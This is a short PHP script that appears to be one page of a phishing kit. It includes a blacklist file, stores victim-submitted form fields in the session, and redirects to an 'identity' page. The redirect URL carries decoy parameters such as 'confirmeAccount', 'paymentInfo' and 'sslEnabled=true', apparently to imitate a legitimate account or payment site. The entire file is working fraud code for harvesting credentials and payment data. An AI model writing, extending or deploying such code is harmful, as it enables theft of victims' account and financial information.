<?php 

include 'includes/functions.php';
include 'includes/BlackList.php';
$rand = randomString(25);
$_SESSION['input3'] = $_POST['input3'];
$_SESSION['input4'] = $_POST['input4'];
$_SESSION['input5'] = $_POST['input5'];
$_SESSION['input6'] = $_POST['input6'];
$_SESSION['input7'] = $_POST['input7'];
$_SESSION['input8'] = $_POST['input8'];
$_SESSION['inputtype'] = $_POST['inputtype'];
header("location: identity.php?cmd=".$rand."&auth=confirmeAccount&path=/paymentInfo/?referrer%3D/account/manage&sslEnabled=true");

?>